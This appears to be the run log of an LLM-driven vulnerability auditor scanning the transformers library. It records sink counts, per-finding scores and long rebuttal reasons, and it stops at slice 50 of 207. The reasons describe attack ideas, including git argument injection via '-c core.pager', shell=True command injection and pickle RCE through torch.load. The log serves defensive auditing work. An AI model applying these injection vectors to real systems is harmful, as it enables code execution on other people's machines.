@@ -1,0 +1,3502 @@
+agies — auditing /tmp/transformers_src
+
+  Languages: JSON, Python, Shell, YAML
+  Files: 6108
+
+  Language: Python
+
+Phase A: Path Discovery
+  Backend: tree-sitter
+  Functions: 35742
+  Phase 0: 12 LLM-discovered sink(s)
+    AcceleratorConfig.from_json_file -> lfi
+    AlbertConfig.from_json_file -> lfi
+    BeamSearchDecoderCTC.load_from_dir -> lfi
+    BeamSearchDecoderCTC.load_from_hf_hub -> ssrf
+    Benchmark.from_json -> lfi
+    BertConfig.from_json_file -> lfi
+    BertConfig.get_config_dict -> lfi
+    BigBirdConfig.from_json_file -> lfi
+    BlenderbotConfig.from_json_file -> lfi
+    BloomConfig.from_json_file -> lfi
+    ConvBertConfig.from_json_file -> lfi
+    CustomHFIndex.load_from_disk -> lfi
+    Remote Code Execution: 48 sink(s)
+    Local File Inclusion: 35 sink(s)
+    Server-Side Request Forgery: 22 sink(s)
+    SQL Injection: 20 sink(s)
+    Arbitrary File Overwrite: 7 sink(s)
+    ReDoS (Regular Expression DoS): 33 sink(s)
+    Suspicious — requires analysis (path constructor / logic pattern): 44 
+sink(s)
+  Cross-file flow: 209 paths annotated
+  Reachability: 1938 sources → 3 sinks (1191 pairs)
+
+Phase A.5: Source Classification
+  Filtered 2 paths (0 constant + 2 config)
+  Remaining: 207/209 paths
+
+Phase B: Slice Sorting (207 paths)
+  --all-paths: sending all 207 paths to analysis
+  Body-detected orphans: 32 (no call chain)
+  Exploit: 0 + Explore: 207
+    Explore: rce-000 check_output score=0.55 (non_std_sink)
+    Explore: rce-001 eval score=0.78 (unusual_naming)
+    Explore: rce-002 __init__ score=0.73 (non_std_sink)
+  Project type: lib
+
+Phase C: README Understanding
+  (skipped — library mode)
+
+Phase D: Library Analysis (207 slices)
+  [1/207] rce-000 (check_output)
+  [2/207] rce-001 (eval)
+  [3/207] rce-002 (__init__)
+  [4/207] rce-003 (checkout_branch)
+  [5/207] rce-004 (get_prs_by_label)
+    ✓ 1/10 - safe
+    Assumptions: rce-000...
+    ✓ 1/10 - safe
+    Assumptions: rce-003...
+    ✓ 2/10 - safe
+    Assumptions: rce-004...
+    ⚠ 8/10 — 1 contradiction(s)
+    Assumptions: rce-002...
+    ? 10/10 — interesting
+    Assumptions: rce-001...
+      6 assumptions (6 violable)
+    Evidence: rce-003...
+      3 assumptions (3 violable)
+    Evidence: rce-000...
+    ? pattern matched (8 match(es))
+  [6/207] rce-005 (get_commit_timestamp)
+      6 assumptions (6 violable)
+    Adversary: rce-002...
+      5 assumptions (5 violable)
+    Evidence: rce-004...
+      6 assumptions (6 violable)
+    path bridge: 1 builder + 1 consumer
+    Adversary: rce-001...
+    ? pattern matched (10 match(es))
+  [7/207] rce-006 (cherry_pick_commit)
+    ? pattern matched (7 match(es))
+  [8/207] rce-007 (commit_in_history)
+    x rebutted
+      reason: The finding claims RCE via `eval(untrusted_user_input)` based on a
+simulated wrapper that is not part of the actual transformers library source 
+code. The provided source code (library implementation) contains no `eval`, 
+`exec`, or any dangerous deserialization call that accepts attacker-controlled 
+input. The call chain listed (train, __getitem__, get, http_user_agent, 
+cached_files, cached_file, _resolve_path, generate_rules_reference, 
+check_modeling_rules_doc) does not include any `eval` sink. The annotation 
+'ENTRY eval' is a mislabel; the first step is actually `return 
+self.train(False)`. The simulated wrapper is an artificial scenario created for 
+analysis purposes and does not reflect real-world usage. Therefore, the 
+vulnerability does not exist in the actual library code.
+    Evidence: rce-001...
+    ? pattern matched (8 match(es))
+  [9/207] rce-008 (run_pytest)
+    x rebutted
+      reason: The finding claims RCE via unsafe deserialization in 
+`convert_model` because untrusted `model_name_or_path` reaches `torch.load`. 
+However, the provided source code does not establish a realistic attack 
+scenario. The function `convert_model` (line 277 in 
+convert_ovis2_weights_to_hf.py) is a utility script intended for local model 
+conversion, not a network-accessible API. The system wrapper simulating a web 
+endpoint is artificial and not part of the actual codebase; the transformers 
+library does not expose this conversion function to external, 
+attacker-controlled input. Moreover, the data flow annotations show no trace 
+from an untrusted entry point (e.g., `__init__`) to `convert_model`. Even if 
+`load_orig_state_dict` uses `torch.load`, the attacker would need to already 
+control the file path provided by the caller, which is the user themselves. In 
+the intended usage, the parameter is supplied by the person running the script, 
+making the scenario a local attack, not a remote code execution. The finding 
+conflates a general pickle deserialization risk with a missing entry-point 
+validation, but fails to prove that an attacker can supply the malicious path in
+any realistic deployment. Therefore, the vulnerability is not authentically 
+exploitable in the given context.
+    Evidence: rce-002...
+    ⚠ 9/10 — 1 contradiction(s)
+    Assumptions: rce-005...
+    ? pattern matched (7 match(es))
+  [10/207] rce-009 (run_ruff)
+    ✓ 2/10 - safe
+    Assumptions: rce-006...
+    ✓ 0/10 - safe
+    Assumptions: rce-007...
+      1 assumptions (1 violable)
+    Adversary: rce-005...
+      no assumptions extracted
+    Evidence: rce-006...
+    x rebutted
+      reason: The argument injection attack is not feasible because the 
+untrusted `commit_sha` parameter is placed after the `git show` subcommand in 
+the argument list (`["git", "show", "-s", "--format=%ct", commit_sha]`). Git 
+global options such as `-c key=value` must appear before the subcommand to be 
+interpreted; they are not valid after the subcommand. The attacker cannot inject
+`-c core.pager=...` to trigger pager execution. No other RCE vector via `git 
+show` with revision arguments is demonstrated or known to be exploitable without
+a pre-existing Git vulnerability. Additionally, the source code is from a 
+library and the provided evidence does not show that `get_commit_timestamp` is 
+reachable from untrusted user input. The simulated web endpoint in the finding 
+is not part of the actual codebase. Therefore, the claimed RCE is not genuinely 
+exploitable.
+    Evidence: rce-005...
+    ? 9/10 — interesting
+    Assumptions: rce-009...
+    ? pattern matched (8 match(es))
+  [11/207] rce-010 (get_runner_status)
+    ? pattern matched (7 match(es))
+  [12/207] rce-011 (get_commit_hash)
+    ⚠ 7/10 — 1 contradiction(s)
+    Assumptions: rce-008...
+    ? 10/10 — interesting
+    Assumptions: rce-011...
+      2 assumptions (2 violable)
+    Evidence: rce-007...
+    ? pattern matched (9 match(es))
+  [13/207] rce-012 (main)
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: rce-010...
+      4 assumptions (4 violable)
+    path bridge: 1 builder + 2 consumer
+    Adversary: rce-009...
+    ? 10/10 — interesting
+    Assumptions: rce-012...
+    x rebutted
+      reason: The finding is not exploitable. The sink `subprocess.run(["ruff", 
+"check", file, "--fix"], ...)` (line 1983) uses a list of arguments with 
+`shell=False`, which prevents command injection — no shell metacharacters can be
+interpreted. The `file` parameter is a file path, not an arbitrary string that 
+could contain shell metacharacters. Even if `file` could be influenced by an 
+attacker (e.g., via a crafted file name), it would only result in Ruff parsing a
+different file, not arbitrary code execution. No unsafe deserialization (pickle,
+yaml, eval) is used anywhere in the provided code. The simulated web wrapper in 
+the analysis header is artificial; the actual library (`check_copies.py`) is a 
+development utility that operates on developer-supplied file paths, not on 
+untrusted user input. There is no reachable, attacker-controlled data flow to 
+the subprocess call. The vulnerability claim is unfounded.
+    Evidence: rce-009...
+      3 assumptions (3 violable)
+    Evidence: rce-011...
+      5 assumptions (5 violable)
+    Adversary: rce-010...
+      4 assumptions (4 violable)
+    Adversary: rce-008...
+    evidence found (8 match(es), 0 sink analyses)
+  [14/207] rce-013 (_get_modified_files)
+    ? pattern matched (7 match(es))
+  [15/207] rce-014 (_run_cmd)
+    not rebutted
+      weak point: The finding is hard to disprove because the code clearly uses 
+`shell=True` with an f-string containing an untrusted token parameter, and there
+is no sanitization. The only realistic limitation is that the `token` is 
+typically expected to be a secret (e.g., GitHub PAT) rather than 
+attacker-controlled input. However, the function is a public API that could be 
+invoked in contexts where the token is derived from user input (e.g., a web 
+service that accepts runner-check requests). The vulnerability is authentically 
+exploitable under that scenario, and the developer has not enforced any access 
+control or input validation.
+    PoC Agent: rce-010...
+  [16/207] rce-015 (build_processor)
+Slice rce-010 failed: '"success"'
+    Error: rce-010: '"success"'
+      6 assumptions (5 violable)
+    Evidence: rce-012...
+    not rebutted
+      weak point: The code does not validate that `test_root` and `suite` result
+in a path within an allowed sandbox. The `relative_to` check is bypassable 
+because the root directory is attacker-controlled. An attacker who can also 
+place a malicious `test_*.py` file in a reachable directory can achieve RCE via 
+pytest execution.
+    PoC Agent: rce-008...
+  [17/207] rce-016 (convert_processors)
+Slice rce-008 failed: '"success"'
+    Error: rce-008: '"success"'
+    ? pattern matched (6 match(es))
+  [18/207] rce-017 (run_ruff)
+    ? 10/10 — interesting
+    Assumptions: rce-013...
+    ✓ 2/10 - safe
+    Assumptions: rce-015...
+    ? 9/10 — interesting
+    Assumptions: rce-014...
+      3 assumptions (3 violable)
+    Evidence: rce-013...
+    ? 10/10 — interesting
+    Assumptions: rce-016...
+    ? pattern matched (8 match(es))
+  [19/207] rce-018 (get_all_config_mappings)
+    ✓ 1/10 - safe
+    Assumptions: rce-017...
+    ? 10/10 — interesting
+    Assumptions: rce-018...
+      5 assumptions (5 violable)
+    Evidence: rce-014...
+      4 assumptions (4 violable)
+    Evidence: rce-015...
+    ? pattern matched (8 match(es))
+  [20/207] rce-019 (run_ruff_and_sort)
+      no assumptions extracted
+    Evidence: rce-016...
+    ? pattern matched (6 match(es))
+  [21/207] rce-020 (load_generation_config)
+      6 assumptions (6 violable)
+    path bridge: 1 builder + 2 consumer
+    Adversary: rce-017...
+    ? pattern matched (6 match(es))
+  [22/207] rce-021 (_save)
+      6 assumptions (6 violable)
+    Evidence: rce-018...
+    ? pattern matched (6 match(es))
+  [23/207] rce-022 (_load_optimizer_and_scheduler)
+    x rebutted
+      reason: The reported RCE vulnerability is not exploitable. The sink 
+function `run_ruff` uses `subprocess.run` with a list argument (`["ruff", 
+"check", file, "--fix"]`), which prevents shell injection (no `shell=True`). The
+attacker-controlled input (`untrusted_user_input`) is passed as the `file` 
+argument, which is a file path. Even if an attacker can control this path, they 
+cannot execute arbitrary commands; the worst case is a path traversal leading to
+processing of unintended files, but that does not constitute remote code 
+execution. Additionally, the code is an internal library utility for the Hugging
+Face Transformers repository, not a network-facing endpoint. The simulated web 
+wrapper in the finding is an artificial construct for analysis; in real usage, 
+`run_ruff` is never invoked with untrusted user input. No unsafe deserialization
+(pickle, yaml, eval) is present. Therefore, the finding is a false positive.
+    Evidence: rce-017...
+    ? pattern matched (8 match(es))
+  [24/207] rce-023 (__init__)
+    ? 5/10 — interesting
+    Assumptions: rce-019...
+    ✓ 2/10 - safe
+    Assumptions: rce-021...
+    ⚠ 8/10 — 1 contradiction(s)
+    Assumptions: rce-022...
+    ⚠ 8/10 — 1 contradiction(s)
+    Assumptions: rce-023...
+    ⚠ 9/10 — 1 contradiction(s)
+    Assumptions: rce-020...
+      4 assumptions (3 violable)
+    Evidence: rce-021...
+    ? pattern matched (6 match(es))
+  [25/207] rce-024 (visualize_attention_mask)
+      6 assumptions (6 violable)
+    Adversary: rce-022...
+      6 assumptions (6 violable)
+    Adversary: rce-023...
+      3 assumptions (3 violable)
+    Evidence: rce-019...
+    x rebutted
+      reason: The finding relies on a simulated system wrapper that is not part 
+of the actual codebase. The provided source code snippets show no concrete data 
+flow from any attacker-controllable entry point to the claimed sinks. The 
+`__init__` in `modular_model_detector.py` only sets logging levels and does not 
+accept any untrusted input. The taint path listing `convert_model` and 
+`apply_chat_template` as sinks lacks any demonstrated call chain or parameter 
+propagation within the project. The static analysis annotations explicitly state
+'Static engine could not trace variable propagation'. Without evidence that an 
+attacker can supply the `model_name_or_path`, `chat_template`, or `checkpoint` 
+arguments to these functions, the vulnerability is not authentically 
+exploitable.
+    Evidence: rce-022...
+    x rebutted
+      reason: The claimed vulnerability relies on a data flow that is not 
+supported by the provided source code. The taint path starts at '__init__' in 
+'modular_model_detector.py' with an 'untrusted_user_input' parameter, but the 
+actual source for that function (shown in the code block) only sets logging 
+levels and does not accept any such parameter. There is no evidence that 
+attacker-controlled input reaches 'convert_model' or 'torch.load'. The call 
+chain between the entry point and the sink is missing; the static analysis 
+annotations explicitly state that variable propagation could not be traced. 
+Without a demonstrable path from untrusted user input to the dangerous sink, the
+finding is not authentically exploitable. Additionally, the Jinja2 template 
+injection claim lacks any evidence that attacker-controlled templates are 
+supplied. Therefore, the finding is rebutted.
+    Evidence: rce-023...
+    ? pattern matched (6 match(es))
+  [26/207] rce-025 (__init__)
+    ? pattern matched (6 match(es))
+  [27/207] rce-026 (__init__)
+    ? pattern matched (8 match(es))
+  [28/207] rce-027 (__init__)
+      5 assumptions (5 violable)
+    Adversary: rce-020...
+    x rebutted
+      reason: The taint path provided in the finding is not supported by the 
+actual source code. The entry point `load_generation_config` (from 
+`trainer_seq2seq.py`) does not call `convert_model`; it only loads a 
+`GenerationConfig` object and has no relation to the Ovis2 weight conversion 
+script. The `convert_model` function in `convert_ovis2_weights_to_hf.py` is a 
+standalone conversion utility, not a library function exposed to external input.
+There is no evidence that an attacker-controlled parameter can reach 
+`load_orig_state_dict` in a realistic deployment. Additionally, the actual 
+implementation of `load_orig_state_dict` is not shown, and modern versions of 
+`torch.load` support `weights_only=True` to mitigate pickle risks, but this is 
+irrelevant because the code path is unreachable from untrusted input. The 
+finding constructs an artificial scenario (simulated web endpoint) that does not
+correspond to any existing codebase usage. Therefore, the vulnerability is not 
+exploitable.
+    Evidence: rce-020...
+    ⚠ 8/10 — 1 contradiction(s)
+    Assumptions: rce-024...
+    ? pattern matched (7 match(es))
+  [29/207] rce-028 (__init__)
+    ⚠ 8/10 — 1 contradiction(s)
+    Assumptions: rce-025...
+    ✓ 2/10 - safe
+    Assumptions: rce-026...
+      3 assumptions (3 violable)
+    Adversary: rce-024...
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: rce-027...
+      3 assumptions (3 violable)
+    Adversary: rce-025...
+    x rebutted
+      reason: The finding is not supported by the provided source code. The 
+critical functions `convert_model`, `load_orig_state_dict`, and the actual 
+`torch.load` call are not shown. The call chain in the taint path includes 
+unrelated functions (e.g., `_cached_compile_jinja_template`, 
+`apply_chat_template`) with no logical connection to model conversion or pickle 
+deserialization. The source code snippets are incomplete and do not demonstrate 
+that untrusted user input reaches `torch.load`. Without verifying the actual 
+implementation, the claim of an exploitable RCE via pickle deserialization is 
+unsubstantiated. The static analysis annotations themselves note that variable 
+propagation could not be traced, further reducing confidence. Therefore, the 
+finding is rebutted.
+    Evidence: rce-024...
+    x rebutted
+      reason: The finding relies entirely on prior knowledge and a claimed taint
+path through `torch.load` in `convert_ovis2_weights_to_hf.py`, but the provided 
+source code snippets do not include the actual implementation of 
+`convert_model`, `load_orig_state_dict`, or any `torch.load` call. The call 
+chain annotations show unrelated functions (chat template utilities, 
+tokenization, quantizers) and do not contain the vulnerable sink. The structured
+evidence itself admits 'The taint path is not fully traceable in the provided 
+snippets' and resorts to unverifiable prior knowledge. Without actual code 
+demonstrating that an attacker-controlled `model_name_or_path` reaches 
+`torch.load` in this file, the finding is unsubstantiated. Additionally, the 
+simulated web endpoint wrap is not part of the real library and does not 
+demonstrate reachability. Per the red‑flag rules, absent concrete evidence in 
+the source, the finding must be rebutted.
+    Evidence: rce-025...
+    ? pattern matched (6 match(es))
+  [30/207] rce-029 (__call__)
+    ? pattern matched (6 match(es))
+  [31/207] rce-030 (__call__)
+      1 assumptions (1 violable)
+    Adversary: rce-027...
+      2 assumptions (2 violable)
+    Evidence: rce-026...
+    ? pattern matched (6 match(es))
+  [32/207] rce-031 (__init__)
+    x rebutted
+      reason: The structured evidence relies on a simulated app controller that 
+is not part of the actual library codebase. The taint path begins with a 
+hypothetical `__init__` function in `modular_model_detector.py` (line 246), 
+which is unrelated to the converter. The actual `convert_ovis2_weights_to_hf.py`
+is a standalone conversion utility; its `convert_model` function is intended to 
+be called with a local file path or model identifier, not from an HTTP endpoint 
+with untrusted user input. No realistic deployment scenario is provided where an
+attacker controls `model_name_or_path`. The finding lacks a credible entry point
+for attacker-controlled data, making the vulnerability inauthentically 
+exploitable in practice.
+    Evidence: rce-027...
+    ? 6/10 — interesting
+    Assumptions: rce-028...
+    ? pattern matched (6 match(es))
+  [33/207] rce-032 (__init__)
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: rce-029...
+    ✓ 2/10 - safe
+    Assumptions: rce-030...
+      3 assumptions (3 violable)
+    Evidence: rce-028...
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: rce-031...
+    ? pattern matched (6 match(es))
+  [34/207] rce-033 (__init__)
+      2 assumptions (2 violable)
+    Evidence: rce-030...
+      3 assumptions (3 violable)
+    Adversary: rce-029...
+    ? pattern matched (6 match(es))
+  [35/207] rce-034 (_deserialize_index)
+      2 assumptions (2 violable)
+    Adversary: rce-031...
+    ⚠ 9/10 — 1 contradiction(s)
+    Assumptions: rce-032...
+    x rebutted
+      reason: The finding assumes that `convert_model` receives untrusted input,
+but the provided source code does not demonstrate any external entry point 
+(e.g., a web endpoint, API, or user-facing function) that passes 
+attacker-controlled data to this function. The call chain shows `__init__` as 
+the entry, but `__init__` has no identifiable parameters and does not propagate 
+external input to `convert_model`. The simulated `@app.post` wrapper is not part
+of the actual library code and cannot be used as evidence of real-world 
+reachability. Without a confirmed taint source (attacker-controlled input), the 
+vulnerability is not authentically exploitable in the given context. The 
+function is a utility script intended to be run by developers on trusted local 
+model files, not exposed to untrusted users. Hence, the finding is rebutted.
+    Evidence: rce-029...
+    x rebutted
+      reason: The finding relies on an artificial simulated web endpoint wrapper
+that is not part of the actual Transformers library. The function 
+`convert_model` in `convert_ovis2_weights_to_hf.py` is a utility script intended
+for offline conversion of model weights, not a public API exposed to untrusted 
+user input. There is no evidence in the provided source code or typical usage 
+that an attacker can control the `model_name_or_path` parameter from an external
+attack surface. The simulated entry point (`__init__`) and call chain are 
+fabricated for analysis and do not correspond to a real reachable path. Even if 
+the code contains unsafe deserialization via `torch.load`, exploitation is not 
+practical without a mechanism to pass attacker-controlled input to this specific
+function in a production environment. Therefore, the finding is not 
+authentically exploitable.
+    Evidence: rce-031...
+    ? pattern matched (6 match(es))
+  [36/207] rce-035 (__init__)
+    ? pattern matched (6 match(es))
+  [37/207] rce-036 (load_tokenizer)
+      3 assumptions (3 violable)
+    Adversary: rce-032...
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: rce-033...
+    x rebutted
+      reason: The finding claims RCE via `torch.load` in 
+`convert_ovis2_weights_to_hf.py`. However, the provided source code does **not**
+contain the actual implementation of `convert_model` or any call to 
+`torch.load`. The snippets shown are from unrelated files (chat_template_utils, 
+tokenization_mistral_common, quantizers, etc.) and a simulated web wrapper that 
+references a generic `__init__` entry point. The `[DATA FLOW]` annotation itself
+admits that the static engine could not trace variable propagation and instructs
+to 'semantically analyze the source code' — yet the critical code is absent. No 
+function bodies for `convert_model`, `load_orig_state_dict`, or the `torch.load`
+sink are visible. The structured evidence’s taint path relies on 'prior 
+knowledge from multiple analysis paths,' but this cannot be verified against the
+incomplete code. Without access to the actual `convert_ovis2_weights_to_hf.py` 
+source, the vulnerability claim is unsubstantiated and must be rebutted as 
+lacking evidence.
+    Evidence: rce-032...
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: rce-034...
+    ? pattern matched (6 match(es))
+  [38/207] rce-037 (__init__)
+    ⚠ 9/10 — 1 contradiction(s)
+    Assumptions: rce-035...
+      4 assumptions (4 violable)
+    Adversary: rce-033...
+    ⚠ 9/10 — 1 contradiction(s)
+    Assumptions: rce-036...
+      1 assumptions (1 violable)
+    Adversary: rce-034...
+    x rebutted
+      reason: The finding claims a taint path from `convert_model` to 
+`torch.load`, but the provided source code does not include the implementation 
+of `load_orig_state_dict` or the actual `torch.load` call. The call chain shows 
+only a docstring for `convert_model` at line 277, not the vulnerable sink. 
+Without the sink code, the data flow from `model_name_or_path` to `torch.load` 
+cannot be verified. Additionally, the simulated web endpoint is not part of the 
+library; the real usage context of `convert_ovis2_weights_to_hf.py` is a 
+standalone conversion script, not a network-exposed API. Therefore, the finding 
+lacks evidence and is not authentically exploitable.
+    Evidence: rce-033...
+      5 assumptions (5 violable)
+    Adversary: rce-035...
+    ? pattern matched (6 match(es))
+  [39/207] rce-038 (__init__)
+    x rebutted
+      reason: The finding claims an RCE via `torch.load` in 
+`convert_ovis2_weights_to_hf.py`, but the provided source code does not contain 
+the actual implementation of `load_orig_state_dict` or any call to `torch.load`.
+The code snippet is fragmented and includes unrelated files (chat template 
+utilities, quantizers, etc.). The taint path `convert_model → 
+load_orig_state_dict → torch.load` is asserted but not verified from the given 
+source. The simulated web endpoint is a synthetic wrapper for analysis, not part
+of the actual library. In real-world context, `convert_model` is a utility for 
+local model conversion, typically invoked by developers with trusted file paths.
+There is no evidence of an attacker-controlled entry point that would allow 
+untrusted input to reach this function. Without a demonstrable data flow from an
+untrusted source to the sink, the finding is not substantiated.
+    Evidence: rce-034...
+    x rebutted
+      reason: The finding claims RCE via `torch.load` in 
+`convert_ovis2_weights_to_hf.py`, but the vulnerable function `convert_model` is
+a standalone conversion script, not a public API of the `transformers` library. 
+It is never called in any realistic user‑facing flow (e.g., `from_pretrained`, 
+`AutoModel`, or any endpoint). The static analyzer's taint path from `__init__` 
+through unrelated modules is artificially connected and does not reflect actual 
+execution. Even if an attacker could somehow invoke `convert_model`, the 
+`model_name_or_path` parameter is typically a local file path provided by the 
+developer, not an untrusted user input. No network‑exposed endpoint or library 
+function passes attacker‑controlled data to this sink. Therefore, the 
+vulnerability is not exploitable in practice.
+    Evidence: rce-035...
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: rce-037...
+    ? pattern matched (6 match(es))
+  [40/207] rce-039 (__init__)
+      6 assumptions (6 violable)
+    Adversary: rce-036...
+    ? pattern matched (6 match(es))
+  [41/207] rce-040 (__init__)
+    not rebutted
+      weak point: The vulnerability is present in the code, but exploitability 
+depends on an attacker controlling the `model_name_or_path` parameter. In 
+typical usage, this function is called by the user locally, not from a 
+network-facing service. However, the code is still technically vulnerable to RCE
+if an untrusted path is supplied. The finding has merit and should survive.
+    PoC Agent: rce-036...
+  [42/207] rce-041 (__init__)
+Slice rce-036 failed: '"success"'
+    Error: rce-036: '"success"'
+      1 assumptions (1 violable)
+    Adversary: rce-037...
+    x rebutted
+      reason: The finding is invalid. The taint path contains multiple logical 
+jumps with no supporting evidence in the provided source snippets. Specifically,
+it claims that `convert_model` (a model conversion function) is reachable from 
+`apply_chat_template` (a chat template function) via `from_pretrained` and 
+`preprocess_model`, but the source code shows no such call chain. The provided 
+code snippets are from unrelated files (modular_model_detector.py, 
+chat_template_utils.py, tokenization_mistral_common.py, quantizers, 
+video_processing_utils.py) and do not include the critical 
+`load_orig_state_dict` or `torch.load` calls. The only snippet from 
+`convert_ovis2_weights_to_hf.py` is a docstring stub with no implementation, 
+making it impossible to verify the claimed sink. Furthermore, the `[SYSTEM 
+WRAPPER]` creates a simulated web endpoint that injects untrusted input into a 
+library that is not designed to be exposed as an API. In real-world usage, 
+`convert_ovis2_weights_to_hf.py` is a one-off conversion script run by a 
+developer with trusted local paths, not a service exposed to attackers. The 
+`model_name_or_path` parameter is not attacker-controlled in any realistic 
+deployment. The taint path from `__init__` through 
+`_cached_compile_jinja_template` to `convert_model` is nonsensical — chat 
+template processing does not invoke model conversion. The finding thus fails on 
+both data flow and practical exploitability.
+    Evidence: rce-037...
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: rce-038...
+    ⚠ 9/10 — 1 contradiction(s)
+    Assumptions: rce-039...
+    ? pattern matched (6 match(es))
+  [43/207] rce-042 (__init__)
+    ✓ 2/10 - safe
+    Assumptions: rce-040...
+      1 assumptions (1 violable)
+    Adversary: rce-038...
+      1 assumptions (1 violable)
+    Adversary: rce-039...
+      1 assumptions (1 violable)
+    Evidence: rce-040...
+    ⚠ 9/10 — 1 contradiction(s)
+    Assumptions: rce-041...
+    x rebutted
+      reason: The finding claims an RCE via pickle deserialization in 
+`convert_ovis2_weights_to_hf.py`, tracing from `convert_model` → 
+`load_orig_state_dict` → `torch.load`. However, the provided source code does 
+**not** contain the actual implementation of these functions. The snippets shown
+are fragmented call chains from multiple unrelated files (e.g., 
+`chat_template_utils.py`, `tokenization_mistral_common.py`, 
+`quantizer_vptq.py`). The critical sink `torch.load` is never visible; only the 
+static data-flow annotations assert its presence. Without seeing the actual 
+`load_orig_state_dict` body or the `torch.load` invocation, the exploitability 
+cannot be verified. Additionally, the simulated wrapper and the disconnected 
+code fragments do not constitute sufficient evidence to confirm that untrusted 
+input reaches a pickle deserialization sink. Therefore, the finding is 
+unsupported by the source code provided and is rebutted.
+    Evidence: rce-038...
+    x rebutted
+      reason: The finding is not authentically exploitable. The claimed 
+vulnerability relies on the function `convert_model` being exposed to untrusted 
+input via a simulated web endpoint, which is not part of the actual library 
+usage. The provided source code does not contain the implementation of 
+`convert_model`, `load_orig_state_dict`, or the `torch.load` call — only a 
+truncated docstring. Without the actual code, the data flow cannot be verified. 
+Even if the code did use `torch.load`, the function is a weight conversion 
+utility intended for offline use by developers, not a network-accessible 
+endpoint. The simulated web wrapper is an artificial construct, not a real 
+attack surface. Therefore, the finding is a false positive based on hypothetical
+exposure and missing implementation details.
+    Evidence: rce-039...
+    ? pattern matched (6 match(es))
+  [44/207] rce-043 (__init__)
+    ? pattern matched (6 match(es))
+  [45/207] rce-044 (_load_processor)
+    ? pattern matched (6 match(es))
+  [46/207] rce-045 (_get_model)
+    ⚠ 9/10 — 1 contradiction(s)
+    Assumptions: rce-042...
+      2 assumptions (2 violable)
+    Adversary: rce-041...
+    x rebutted
+      reason: The taint path contains multiple logical jumps with no evidence 
+that untrusted user input from the simulated entry point (__init__ in 
+modular_model_detector.py) actually reaches `convert_model` and `torch.load`. 
+The intermediate functions (_cached_compile_jinja_template, 
+_compile_jinja_template, _get_template_variables, apply_chat_template) are 
+unrelated to model conversion; no call relationship is shown between them and 
+`convert_model`. The static analysis explicitly noted it could not trace 
+variable propagation. The provided source code snippets are incomplete and do 
+not demonstrate a real call chain. Additionally, the system wrapper simulating a
+web endpoint is not part of the actual library and cannot be assumed. Without a 
+verifiable data flow from attacker-controlled input to the pickle 
+deserialization sink, the claimed RCE is not authentically exploitable.
+    Evidence: rce-041...
+      5 assumptions (5 violable)
+    Adversary: rce-042...
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: rce-043...
+    ? pattern matched (6 match(es))
+  [47/207] rce-046 (_get_model)
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: rce-045...
+    x rebutted
+      reason: The finding's taint path contains a critical logical jump: the 
+entry point `__init__` (from `modular_model_detector.py`) has no visible 
+connection to `convert_model` (from `convert_ovis2_weights_to_hf.py`). The 
+provided source code shows `__init__` only sets logging levels and has no 
+identifiable parameters, while `convert_model` is shown only as a docstring 
+without any body or call site. There is no evidence that untrusted user input 
+ever reaches the `model_name_or_path` parameter of `convert_model`, nor that 
+`load_orig_state_dict` is invoked within it. The data flow relies on unstated 
+assumptions and incomplete traces, making the alleged RCE chain unsubstantiated.
+Additionally, the sink (`torch.load`) is not shown in the code snippets. 
+Therefore, the vulnerability is not authentically exploitable based on the 
+provided evidence.
+    Evidence: rce-042...
+    ⚠ 7/10 — 1 contradiction(s)
+    Assumptions: rce-044...
+    ? pattern matched (6 match(es))
+  [48/207] lfi-047 (run)
+      4 assumptions (4 violable)
+    Adversary: rce-043...
+      3 assumptions (3 violable)
+    Adversary: rce-045...
+      6 assumptions (6 violable)
+    Adversary: rce-044...
+    x rebutted
+      reason: The finding overstates the attack surface. `convert_model` is a 
+utility function in a conversion script (`convert_ovis2_weights_to_hf.py`) 
+intended for offline, developer-led model conversion. The simulated HTTP 
+endpoint is hypothetical and not part of the actual codebase. There is no 
+evidence that `model_name_or_path` is ever sourced from an untrusted external 
+input (e.g., network request) in the real library. The function is not exposed 
+via any API endpoint, web service, or inter-process communication point. Without
+an attack vector that delivers an attacker-controlled path to `torch.load`, the 
+vulnerability is not remotely exploitable. The finding relies on an artificial 
+wrapper that does not exist in production. Therefore, the finding is not 
+authentically exploitable in the context of the transformers library as 
+distributed.
+    Evidence: rce-045...
+    x rebutted
+      reason: The finding is not authentically exploitable.  While `torch.load` 
+uses pickle and is unsafe in principle, the `convert_model` function is a 
+utility intended for offline model conversion (e.g., script-run), not a public 
+API exposed to untrusted user input. The simulated web endpoint is a 
+hypothetical wrapper not present in the actual codebase.  Even if a web service 
+wrapped this library, the attacker would only control a string path; to achieve 
+RCE they would need to already have a malicious pickle file on the filesystem 
+(or control a remote resource that `torch.load` fetches – which it does not 
+natively do).  No practical attack scenario exists.  Additionally, the static 
+analysis call chain shows many unrelated functions and likely suffers from 
+over‑tainting; the actual path from an untrusted input to `convert_model` is not
+demonstrated in the real deployment context.
+    Evidence: rce-043...
+    x rebutted
+      reason: The finding is rebutted because the provided source code snippets 
+do not contain the actual implementation of the claimed vulnerable sinks. For 
+instance, the `convert_model` function (lines 277-285) only shows its docstring 
+and signature; the body that allegedly calls `torch.load()` is not visible. 
+Similarly, the `_load_processor` function (lines 225-230) shows only a docstring
+and a comment referencing `AutoProcessor`; no actual call to `from_pretrained` 
+with `trust_remote_code` is present. Without the full code, there is no evidence
+that `torch.load()` or `AutoProcessor.from_pretrained()` are invoked with 
+attacker-controlled inputs. Additionally, the taint path includes unrelated 
+functions like chat template utilities that have no clear connection to the RCE 
+sinks, suggesting the trace is speculative. The claim that empty developer 
+intent summaries constitute a contradiction is not a valid security 
+issue—missing documentation does not prove a vulnerability. Therefore, the 
+finding lacks sufficient evidence and is not exploitable based on the provided 
+code.
+    Evidence: rce-044...
+    ⚠ 9/10 — 1 contradiction(s)
+    Assumptions: rce-046...
+    ✓ 2/10 - safe
+    Assumptions: lfi-047...
+    ? pattern matched (6 match(es))
+  [49/207] lfi-048 (get_tiny_model_names_from_repo)
+    ? pattern matched (6 match(es))
+  [50/207] lfi-049 (build_model_overrides)
